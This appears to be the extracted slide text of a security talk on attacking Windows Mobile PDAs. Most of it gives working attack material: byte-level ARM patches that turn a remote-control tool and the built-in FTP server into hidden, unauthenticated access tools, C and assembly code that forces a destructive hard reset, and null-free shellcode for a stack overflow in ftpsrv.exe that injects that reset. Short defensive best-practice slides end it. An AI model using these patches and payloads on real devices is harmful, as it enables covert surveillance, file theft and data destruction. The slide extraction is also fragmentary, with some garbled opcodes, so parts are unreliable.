– Mov R0, R0 = Virtual NOP
The Invisible Spy – ex. 1.3
• 0001210C - Minimize
– MOV     R3, #0x10000000 
 MOV     R3, #0x20000000
– 01 32 A0 E3
 02 32 A0 E3
– 0001210C 
 150C
• 0001219C - ShowWindow
– BL      ShowWindow
 MOV R0, R0 (Virtual NOP)
– A6 15 00 EB
 00 00 A0 E1
– 0001219C   
 159C
• 000121A4 - UpdateWindow
– BL      UpdateWindow
 MOV R0, R0
– A1 15 00 EB
 00 00 A0 E1
– 000121A4
 15A4
The Invisible Spy – ex. 1.4
• What do you get?
– Full hidden remote viewing/control
– Alerting feature when on WLAN/LAN
– Could be easily placed in Windows\Startup folder
• How can you stop?
– Firewall
– Monitor running processes
– Not true virus  AV useless
• That cool, but what about remote file access?
The Hidden FTP Server
• Ftpsrv.exe
– No authentication
– Does not show up in program memory listing
– FULL access to PDA files
– Visible icon and defaulted to port 21 
The Hidden FTP Server - ex. 2.1
•
Locate window Icon functions (DEMO START)
•
Shell_NotifyIcon - This function sends a message to the system to 
add, modify, or delete an icon from the taskbar status area.
– Shell_NotifyIcon(
DWORD dwMessage,
PNOTIFYICONDATA pnid );
•
dwMessage
– NIM_ADD, NIM_MODIFY , NIM_DELETE
•
Shellapi.h
– #define NIM_ADD 0
– #define NIM_MODIFY 1
– #define NIM_DELETE 2
The Hidden FTP Server – ex. 2.2
• 00013AC8 - Shell_NotifyIcon Create
– MOV 
Shell_NotifyIcon
 MOV R0, R0
– 3A 01 00 EB
 00 00 A0 E1
– 00013AC8 
 2EC8
• 00013B18 - Shell_NotifyIcon Delete
– BL
Shell_NotifyIcon
 MOV R0, R0
– 26 01 00 EB
 00 00 A0 E1
– 00013B18   
 2F18
• 0001694C – Change Port
– 0x15 = 21
 ?? (0x2D = 45)
– 0001694C
 454C
• What do you get?
– Full hidden remote file access
– Could be easily placed in Windows\Startup folder
• How can you stop?
– Firewall
– Monitor running processes
– Not true virus  AV useless
• That cool, but what about remote malicious attacks?
The Hidden FTP Server – ex. 2.3
#include 
#include 
#define IOCTL_HAL_REBOOT CTL_CODE(FILE_DEVICE_HAL, 15, 
METHOD_BUFFERED, FILE_ANY_ACCESS)
extern "C" __declspec(dllimport)void SetCleanRebootFlag(void);
extern "C" __declspec(dllimport) BOOL KernelIoControl(
DWORD dwIoControlCode, 
LPVOID lpInBuf, 
DWORD nInBufSize, 
LPVOID lpOutBuf, 
DWORD nOutBufSize, 
LPDWORD lpBytesReturned);
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
LPTSTR lpCmdLine, int nCmdShow)
{
SetCleanRebootFlag();
KernelIoControl(IOCTL_HAL_REBOOT, NULL, 0, NULL, 0, NULL);
return 0;
}
Hard Reset Code – ex. 3.1
•
LDR     
R0, =SetCleanRebootFlag Set R0 = Clean Reboot Flag
•
LDR     
R1, [R0]
Load R1 with value in R0
•
MOV     
LR, PC
Move PC to LR
•
MOV     
PC, R1
Move R1 to PC
•
MOV
R3, #0
R3 = 0
•
STR     
R3, [SP,#4] 
Store R3 at SP + 4
•
MOV     
R0, #0
R0 = 0
•
STR     
R0, [SP] 
Store R0 at SP
•
MOV     
R3, #0
R3 = 0
•
MOV     
R2, #0
R2 = 0
•
MOV     
R1, #0
R1 = 0
•
LDR     
R0, =0x101003C
R0 = IOCTL_HAL_REBOOT 
•
LDR     
R4, =KernelIoControl
R4 = KernelloControl Function Addr
•
LDR     
R4, [R4] 
Load R4 with value in R4 Addr
•
MOV     
LR, PC
Move PC to LR
•
MOV     
PC, R4  Reset!
Set PC = KernelloControl  Reset!
Hard Reset Code – ex. 3.2
• Ftpsrv.exe
– FTP servers are notorious for buffer overflows
– mkdir, cd, etc partially vulnerable  x00
– Raw FTP commands vuln via unchecked strcpy
– Overwrite PC (return address) register
– Standard ‘Smash stack’ overflow
– Hard reset code injection?
FTP Buffer Overflow – ex. 4.1
• sub_12F28 (demo AAAAA)
– ...00012FE0   ldmia     sp!, {r4 - r6, pc}
– SP = 0007FB28  PC = 0007FB34 = ?? ?? ?? ??
• Unabridged reset code fails
– 0x00 not allow  convert all 00 to 01
• No XOR on ARM…but there is AND
– Mov r1, #1  01 10 A0 E3 (E3A01001)
– AND R1, R1, 0xF0  F0 10 01 E2 (E20110F0)
• 11110000 & 00000001 = 00000000
• Replace all 0x01 with 0x00
– STRB R1, PC, 34 (00 00 A0 E3  01 00 A0 E3)
FTP Buffer Overflow – ex. 4.2
•
E3A01001
MOV R1, #1
•
E20110F0
AND R1, R1, 0xF0
•
E5CF102C #10 STRB R1, PC, 2C
•
E5CF1029 #9 STRB R1, PC, 2C
•
E5CF1028 #8 STRB R1, PC, 2C
•
E5CF1025 #7 STRB R1, PC, 2C
•
E5CF1025 #6 STRB R1, PC, 2C
•
E5CF1024 #5 STRB R1, PC, 2C
•
E5CF1024 #4 STRB R1, PC, 2C
•
E5CF1024 #3 STRB R1, PC, 2C
•
E5CF1025 #2 STRB R1, PC, 2C
•
E5CF1031 #1 STRB R1, PC, 2C
FTP Buffer Overflow – ex. 4.3 Demo
13.
E59F1034    
LDR R1, PC+34
14.
E1A0E00F
MOV LR, PC
15.
E1A0FO01 
MOV PC, R1
16.
E3A00101 #9 #10
MOV R0, 0
17.
E58D0101 #7  #8
STR R0, SP
18.
E58D0104 #6
STR R0, SP+4
19.
E3A03001 #5
MOV R3, 0
20.
E3A02001 #4
MOV R2, 0
21.
E3A01001 #3
MOV R1, 0
22.
E59F0108 #2
LDR R0, PC+8
23.
E59F4008 
LDR R4, PC+8
24.
E1A0E00F
MOV LR, PC
25.
E1A0F004 
MOV PC, R4
26.
0101013C #1IOCTL_HAL_REBOOT
27.
01F730FC DATA
28.
01F74F74 DATA
FTP Buffer Overflow – ex. 4.4
• Demo
• Challenges
– Offset value not static
– Value for reset not static (OEM & OS)
• Dell vs. iPAQ
• Windows CE versions (minor and major)
– Ftpsrv.exe always crashes,
– …but PDA doesn’t always reset.
PDA Best Practices
• PDA Policy
– Understand these devices are going to be used…be 
proactive.
– Ask these questions:
• Who needs it (CEO, IT Admins)?
• What will they use it for (email, contacts, task list)?
• Why will they use it (cool toy, productivity)?
• Where will they use it (home, work, on the road)?
• How does it need protected?
PDA Best Practices: Cont.
• PDA Security Tips
– Enterprise managed and owned PDA
– Control amount/type of data stored
– Encrypt all sensitive data
– Strong password (default four digit PIN is weak)
– Data wipe feature
– Encrypted and Secure synchronization
– Use VPN, ssh, SSL, X.509 certificates, Smartcard
– Logging ability
– Firewall and AV
– Backup regularly
Summary
The PDA (Windows Mobile is not secure…
…Any questions?
PI:EMAIL
References
• www.arm.com
• http://www.ngine.de/gbadoc/armref.pdf
• http://www.eecs.umich.edu/speech/docs/a
rm/ARM7TDMIvE.pdf
• www.kaos.net
• Samija, Gerard Ivan. (2004) Downloadable 
Threats to Pocket PC Data.